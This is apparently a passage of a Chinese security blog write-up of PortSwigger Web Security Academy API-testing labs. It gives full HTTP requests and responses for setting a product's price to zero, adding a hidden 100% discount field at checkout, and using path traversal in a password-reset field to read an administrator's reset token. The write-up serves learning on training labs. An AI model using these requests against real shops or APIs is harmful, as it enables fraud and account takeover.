+<p>登录账号后，再次测试 <code>PATCH</code>，提示：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;ClientError&quot;</span><span class="punctuation">,</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">400</span><span class="punctuation">,</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;Only &#x27;application/json&#x27; Content-Type is supported&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>说明需要发送数据过去，改成如下请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PATCH</span> <span class="string">/api/products/1/price</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a8e00750485ac3a81cdfd8d0034009d.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=X3f9vxYJvTPXb7ViZkQQyhoqxPteNf6H</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>13</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;price&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>17</span><br><span class="line"></span><br><span class="line"><span class="language-bash">&#123;<span class="string">&quot;price&quot;</span>:<span class="string">&quot;<span class="variable">$0</span>.00&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>刷新商品页面，价格已经是 <code>0</code>，此时购买商品即可。如果购物车里有原价商品，需要先清空购物车。</p>
+<h3 id="2-4-Lab-Exploiting-a-mass-assignment-vulnerability"><a href="#2-4-Lab-Exploiting-a-mass-assignment-vulnerability" class="headerlink" title="2.4 Lab: Exploiting a mass assignment vulnerability"></a>2.4 Lab: Exploiting a mass assignment vulnerability</h3><blockquote>
+<p>To solve the lab, find and exploit a mass assignment vulnerability to buy a <strong>Lightweight l33t Leather Jacket</strong>. You can log in to your own account using the following credentials: <code>wiener:peter</code>.</p>
+</blockquote>
+<p>登陆后，加购物车，提交订单，发送如下请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/checkout</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0aed0071042eed9b81c4a80f002a00c9.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=Pr14FxxcsmHH3tPKZ4xdqB3BjXUsJIb5</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>53</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain;charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;chosen_products&quot;</span>:[&#123;<span class="string">&quot;product_id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;quantity&quot;</span>:<span class="number">1</span>&#125;]&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>购物车页面也会触发请求 <code>GET /api/checkout HTTP/2</code>，响应如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span><span class="punctuation">: </span>nosniff</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>153</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;chosen_discount&quot;</span>:&#123;<span class="string">&quot;percentage&quot;</span>:<span class="number">0</span>&#125;,<span class="string">&quot;chosen_products&quot;</span>:[&#123;<span class="string">&quot;product_id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Lightweight <span class="subst">\&quot;</span>l33t<span class="subst">\&quot;</span> Leather Jacket&quot;</span>,<span class="string">&quot;quantity&quot;</span>:<span class="number">1</span>,<span class="string">&quot;item_price&quot;</span>:<span class="number">133700</span>&#125;]&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试触发如下请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/checkout</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0aed0071042eed9b81c4a80f002a00c9.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=Pr14FxxcsmHH3tPKZ4xdqB3BjXUsJIb5</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>90</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain;charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;chosen_discount&quot;</span>:&#123;<span class="string">&quot;percentage&quot;</span>:<span class="number">100</span>&#125;,<span class="string">&quot;chosen_products&quot;</span>:[&#123;<span class="string">&quot;product_id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;quantity&quot;</span>:<span class="number">1</span>&#125;]&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接就 OK 了。所谓 <strong>Mass Assignment</strong>，不过是自行增加一些隐藏的参数。</p>
+<h3 id="2-5-Lab-Exploiting-server-side-parameter-pollution-in-a-REST-URL"><a href="#2-5-Lab-Exploiting-server-side-parameter-pollution-in-a-REST-URL" class="headerlink" title="2.5 Lab: Exploiting server-side parameter pollution in a REST URL"></a>2.5 Lab: Exploiting server-side parameter pollution in a REST URL</h3><blockquote>
+<p>To solve the lab, log in as the <code>administrator</code> and delete <code>carlos</code>.</p>
+</blockquote>
+<p>尝试找回密码，发现 API <code>/forgot-password</code>，而且 <code>username</code> 字段可以<a href="https://secdroid.github.io/tags/Path-Traversal/">路径穿越</a>，比如：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/forgot-password</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ada00c203191330813b5256002200de.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=Jw9VlFmbZMM1g86rpWaIyvuikFI91zyX</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>70</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">csrf</span>=TDevXKgRujKyZpapYuS3ouqSUXhR8TJb&amp;username=administrator/../carlos</span></span><br></pre></td></tr></table></figure>
+
+<p>返回如下请求（<code>carlos</code> 的信息）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>53</span><br><span class="line"></span><br><span class="line"><span class="language-perl">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;******<span class="variable">@carlos</span>-montoya.net&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;email&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然，这个路径穿越使用 Burp Scanner 也可以快速扫出来。</p>
+<p>进一步测试，发现 <code>username=../users/administrator</code> 也可以，说明上一级目录是 <code>users</code>。</p>
+<p>通过请求 <code>username=../../v1/users/administrator</code>，可以确认再上一级目录是 <code>v1</code>。实际上，<code>v2</code> 也是存在的。</p>
+<p>而测试 <code>username=../../../..</code> 时，开始返回 <code>Not Found</code>。</p>
+<p>测试 <code>&amp;username=../../../../openapi.json%23</code>，返回如下信息：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Unexpected response from API server:\n&#123;\n  \&quot;openapi\&quot;: \&quot;3.0.0\&quot;,\n  \&quot;info\&quot;: &#123;\n    \&quot;title\&quot;: \&quot;User API\&quot;,\n    \&quot;version\&quot;: \&quot;2.0.0\&quot;\n  &#125;,\n  \&quot;paths\&quot;: &#123;\n    \&quot;/api/internal/v1/users/&#123;username&#125;/field/&#123;field&#125;\&quot;: &#123;\n      \&quot;get\&quot;: &#123;\n        \&quot;tags\&quot;: [\n          \&quot;users\&quot;\n        ],\n        \&quot;summary\&quot;: \&quot;Find user by username\&quot;,\n        \&quot;description\&quot;: \&quot;API Version 1\&quot;,\n        \&quot;parameters\&quot;: [\n          &#123;\n            \&quot;name\&quot;: \&quot;username\&quot;,\n            \&quot;in\&quot;: \&quot;path\&quot;,\n            \&quot;description\&quot;: \&quot;Username\&quot;,\n            \&quot;required\&quot;: true,\n            \&quot;schema\&quot;: &#123;\n        ...&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>原来 API 路径是 <code>/api/internal/v1/users/&#123;username&#125;/field/&#123;field&#125;</code>。</p>
+<p>请求 <code>username=administrator/field/reset-token%23</code>，提示：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;error&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="string">&quot;This version of API only supports the email field for security reasons&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后测试到 <code>username=../../v1/users/administrator/field/passwordResetToken%23</code>，得到 Token 如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;passwordResetToken&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3wux5qfa2tgzxyx6sp6zqp9c8cucjgah&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>reset-token</code> 和 <code>passwordResetToken</code> 来自 <code>/static/js/forgotPassword.js</code>，关键代码如下所示：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">forgotPwdReady</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> queryString = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;<span class="attr">https</span>:<span class="comment">//apisix.apache.org/zh/blog/2023/02/08/what-is-restful-api/</span></span><br><span class="line">    <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(queryString);</span><br><span class="line">    <span class="keyword">const</span> resetToken = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;reset-token&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (resetToken)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">`/forgot-password?passwordResetToken=<span class="subst">$&#123;resetToken&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">const</span> forgotPasswordBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;forgot-password-btn&quot;</span>);</span><br><span class="line">        forgotPasswordBtn.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, displayMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>/forgot-password?passwordResetToken=3wux5qfa2tgzxyx6sp6zqp9c8cucjgah</code> 重置管理员密码即可。</p>
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><ul>
+<li>API 路径回溯访问<ul>
+<li>比如从 <code>/api/user/carlos</code> 一步一步回退到 <code>/api</code></li>
+</ul>
+</li>
+<li>服务器在拿到 URL 参数时，可能会和其他参数进行拼接操作，再转发给后端服务器进一步处理<ul>
+<li>这里可能存在参数注入问题</li>
+</ul>
+</li>
+<li>HTTP Method</li>
+<li>理解 Mass Assignment Vulnerability（自行增加一些隐藏的参数）</li>
+<li>Burp Scanner 使用方法</li>
+<li>常见 API 路径，以及 API 文档名称<ul>
+<li><code>/api/internal/v1/users/&#123;username&#125;/field/&#123;field&#125;</code></li>
+<li><code>openapi.json</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="0x04-RESTful-API"><a href="#0x04-RESTful-API" class="headerlink" title="0x04. RESTful API"></a>0x04. RESTful API</h2><p>关于 RESTful API，网上有很多介绍，这里不再赘述。前面的题目中，有两个是关于 Server-side Parameter Pollution（服务端参数污染）的，因为后端可能涉及到 URL 重写和转发，所以还是可以理解的。就和 <a href="https://secdroid.github.io/2025/01/21/burp-web-academy-http-request-smuggling/">HTTP 请求走私</a> 一样，现代 Web 架构中，服务端可能存在多个不同的组件或节点，就会涉及到请求的转发、重写等操作。</p>
+<p><img src="/images/restful-api-gateway-architecture.webp" alt="RESTful API 网关架构"></p>
+<h2 id="0x05-参考文档"><a href="#0x05-参考文档" class="headerlink" title="0x05. 参考文档"></a>0x05. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#api-testing">https://portswigger.net/web-security/all-labs#api-testing</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods</a></li>
+<li><a target="_blank" rel="noopener" href="https://apisix.apache.org/zh/blog/2023/02/08/what-is-restful-api/">https://apisix.apache.org/zh/blog/2023/02/08/what-is-restful-api/</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Path-Traversal/" rel="tag"># Path Traversal</a>
+              <a href="/tags/Burp-Intruder/" rel="tag"># Burp Intruder</a>
+              <a href="/tags/API/" rel="tag"># API</a>
+              <a href="/tags/HTTP-Method/" rel="tag"># HTTP Method</a>
+              <a href="/tags/Burp-Scanner/" rel="tag"># Burp Scanner</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/21/burp-web-academy-dom-based-vulnerabilities/" rel="prev" title="Burp Web Academy DOM-based Vulnerabilities">
+                  <i class="fa fa-angle-left"></i> Burp Web Academy DOM-based Vulnerabilities
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
